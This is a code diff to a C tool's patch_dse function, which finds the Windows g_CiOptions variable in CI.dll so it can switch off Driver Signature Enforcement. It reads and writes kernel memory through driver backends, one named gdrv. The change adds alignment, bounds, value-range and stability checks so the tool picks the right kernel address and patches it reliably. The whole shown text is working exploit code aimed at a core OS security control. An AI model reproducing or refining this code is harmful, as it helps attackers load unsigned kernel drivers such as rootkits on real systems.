@@ -1322,19 +1322,38 @@ static BOOL patch_dse(UINT64 *out_kva,UINT64 *out_orig) {
     UINT64 kva = find_ci_options_precise(ci_base);
 
     /* For physical backends, verify the precise result before trusting it.
-       If the CI.dll pattern changed on this Win11 build, the RIP-relative scan
-       might resolve to a stale/wrong RVA — kwrite to the wrong physical address
-       corrupts a page table entry → IRQL_NOT_LESS_OR_EQUAL at DISPATCH_LEVEL.
+       Three-layer check: alignment + CI.dll bounds, then DWORD read (far more
+       discriminating than 1-byte — g_CiOptions is a DWORD whose upper 3 bytes are
+       always 0x00 in production CI.dll, so valid DWORD is 0-63), then a stability
+       re-read after 15 ms (static globals are stable; stack/pool memory changes).
        gdrv SMAP makes kread unreliable so skip verification there. */
     if (kva && g_backend != BE_GDRV) {
-        UINT64 cur = 0;
-        if (!kread(kva, 1, &cur) || (cur != 0x06 && cur != 0x00)) {
-            logf("[!] precise: kva=0x%016llX kread=0x%02llX — unexpected, discarding",
-                 (unsigned long long)kva, (unsigned long long)cur);
-            kva = 0; /* fall through to AOB scan */
-        } else {
-            logf("[*] precise: kva=0x%016llX verified (val=0x%02llX)",
-                 (unsigned long long)kva, (unsigned long long)cur);
+        /* Layer 1: alignment + bounds */
+        if ((kva & 3) || kva < ci_base || kva >= ci_base + (UINT64)vsz) {
+            logf("[!] precise: kva=0x%016llX misaligned or outside CI.dll — discarding",
+                 (unsigned long long)kva);
+            kva = 0;
+        }
+        if (kva) {
+            /* Layer 2: DWORD read — g_CiOptions DWORD value must be 0..63 */
+            UINT64 cur = 0;
+            if (!kread(kva, 4, &cur) || cur > 0x3F) {
+                logf("[!] precise: kva=0x%016llX DWORD=0x%08llX — unexpected, discarding",
+                     (unsigned long long)kva, (unsigned long long)cur);
+                kva = 0;
+            } else {
+                /* Layer 3: stability — static global value must not change */
+                UINT64 cur2 = 0;
+                Sleep(15);
+                if (!kread(kva, 4, &cur2) || cur2 != cur) {
+                    logf("[!] precise: kva=0x%016llX unstable 0x%08llX→0x%08llX — discarding",
+                         (unsigned long long)kva, (unsigned long long)cur, (unsigned long long)cur2);
+                    kva = 0;
+                } else {
+                    logf("[*] precise: kva=0x%016llX DWORD=0x%02llX stable — verified",
+                         (unsigned long long)kva, (unsigned long long)cur);
+                }
+            }
         }
     }
 
@@ -1348,15 +1367,29 @@ static BOOL patch_dse(UINT64 *out_kva,UINT64 *out_orig) {
         if(n) {
             if(g_backend!=BE_GDRV) {
                 for(ULONG ci=0; ci<n && !kva; ci++) {
-                    UINT64 cur=0;
-                    if(kread(cands[ci],1,&cur) && cur==0x06) {
-                        kva=cands[ci];
-                        logf("[*] AOB cand[%lu]=0x%016llX verified (val=0x%02llX)",
-                             (unsigned long long)ci,(unsigned long long)kva,(unsigned long long)cur);
-                    } else {
-                        logf("[*] AOB cand[%lu]=0x%016llX skipped (val=0x%02llX)",
-                             (unsigned long long)ci,(unsigned long long)cands[ci],(unsigned long long)cur);
+                    /* Alignment + bounds guard first */
+                    if ((cands[ci] & 3) || cands[ci] < ci_base || cands[ci] >= ci_base+(UINT64)vsz) {
+                        logf("[*] AOB cand[%lu]=0x%016llX misaligned/oob — skip",
+                             (unsigned long long)ci,(unsigned long long)cands[ci]);
+                        continue;
                     }
+                    /* DWORD verify: upper 3 bytes must be 0, byte must be 0x06 (enabled) */
+                    UINT64 cur=0;
+                    if(!kread(cands[ci],4,&cur) || cur > 0x3F || (cur & 0xFF) != 0x06) {
+                        logf("[*] AOB cand[%lu]=0x%016llX DWORD=0x%08llX — skip",
+                             (unsigned long long)ci,(unsigned long long)cands[ci],(unsigned long long)cur);
+                        continue;
+                    }
+                    /* Stability re-read */
+                    UINT64 cur2=0; Sleep(15);
+                    if(!kread(cands[ci],4,&cur2) || cur2 != cur) {
+                        logf("[*] AOB cand[%lu]=0x%016llX unstable — skip",
+                             (unsigned long long)ci,(unsigned long long)cands[ci]);
+                        continue;
+                    }
+                    kva=cands[ci];
+                    logf("[*] AOB cand[%lu]=0x%016llX DWORD=0x%02llX stable — verified",
+                         (unsigned long long)ci,(unsigned long long)kva,(unsigned long long)cur);
                 }
             } else {
                 kva=cands[0];
